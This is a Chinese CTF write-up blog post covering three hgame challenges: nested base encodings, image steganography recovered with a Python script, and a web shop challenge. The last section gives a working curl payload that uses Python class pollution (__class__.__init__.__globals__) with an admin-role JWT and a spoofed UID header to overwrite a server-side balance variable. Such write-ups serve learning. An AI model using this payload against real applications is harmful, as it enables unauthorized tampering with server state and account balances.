---
title: DODOR的hgame复现与知识点总结
date: 2026-02-27 20:30:15
tags:
 - CTF
 - Misc
categories:
  - 技术
---

看过wp后的复现wwwww,留档做个记录。

## 打好基础

之前一直不知道Base100就是将每个字节（8位，值域0-255）映射到一个特定的表情符号。编码表通常包含256个不同的表情符号，每个符号对应一个唯一的字节值。编码过程直接将字节流转换为表情符号序列，解码则是反向操作。

例如，原始文本“Hello”（十六进制：48 65 6C 6C 6F）可能被编码为一串表情符号，如：🐟 🐠 🐡 🐡 🐢（具体符号因编码表而异）‌

扔给ai识别说有85个表情自然就陷入了Base85(虽然后面还是会用到)非常明确肯定是base大家族。但是无论是从已知的形式hgame{}来看还是首字母来看都无法解密。（其实应该看到打好基础就知道是base的嵌套，当时没有想到。。。

经过base100,92，91，85，64，62，58，45，32后即可得到flag。

## shiori不想找女朋友

这题完全是因为我自己的问题，直接用windows打开解压后发现只有一张图片，通过exiftool发现其中有一段json：

```json
{"block": 1, "start_x": 10, "start_y": 10, "step_x": 7, "step_y": 7,
"column_num": 450}
```



一种隐写，起始位置和步长全标出来了写脚本复原：

```python
from PIL import Image

CHALLENGE_FILE = "shiori.png"

OUTPUT_FILE = "key.png"

def solve():

  img = Image.open(CHALLENGE_FILE)

  b = 1

  sx = 10

  sy = 10

  dx = 7

  dy = 7

  w_blocks = 450

  canvas_w = w_blocks * b

  canvas_h = 600

  restored_img = Image.new('RGB', (canvas_w, canvas_h), 'lightgray')

  c_w, c_h = img.size

  carrier_x, carrier_y = sx, sy

  target_col, target_row = 0, 0

  count = 0

  while True:

​    if carrier_y + b > c_h:

​      break

​    box = (carrier_x, carrier_y, carrier_x + b, carrier_y + b)

​    block = img.crop(box)

​    paste_x = target_col * b

​    paste_y = target_row * b

​    if paste_y + b > canvas_h: 

​      break

​    restored_img.paste(block, (paste_x, paste_y))

​    count += 1

​    target_col += 1

​    if target_col >= w_blocks:

​      target_col = 0

​    target_row += 1

​    carrier_x += dx

​    if carrier_x + b > c_w:

​      carrier_x = sx

​    carrier_y += dy

  restored_img.save(OUTPUT_FILE)

if __name__ == "__main__":

  solve()
```

(wp的脚本，更加简洁)
然后组成图片如下

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/reconstructed_hidden.png)

然后就可以解密拿到一个其实是png的jpg了，我们用convert把他转化成jpg，alpha通道会自动丢弃得到flag。(以后我一定先查附件本身压缩(哭))

## VIDARSHOP

我那个时候其实注意力全放在jwt上了，以为是jwt弱密钥爆破，结果jwt里面带的是usename而且也不靠他来检验身份，做了很多无用功(😂)，原来不是窃取管理员身份,而是借助管理员id改我自己的钱。有考虑过原型链污染，但是uid的生成逻辑我完全没想到。

这题根据提示需要我们覆盖balance的值，同时有一个/api/update的端口通过

```python
__class__.__init__.__globals__
```

访问全局变量balance并覆盖：以下是payload:

```bash
curl -X POST http://forward.vidar.club:32530/api/update \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidWlkIjoiMTQxMzkxNCIsImV4cCI6MTc3MjA3NTEwNH0.fck9rFNaNobg-GdL-XgIRWxSamSGBh4vM61Y6aaqg5s" \
  -H "Content-Type: application/json" \
  -H "UID: 1413914" \
  -d '{"__class__": {"__init__": {"__globals__": {"balance": 1000000}}}}'
```

刷新界面会发现我们的余额已经可以买flag了。

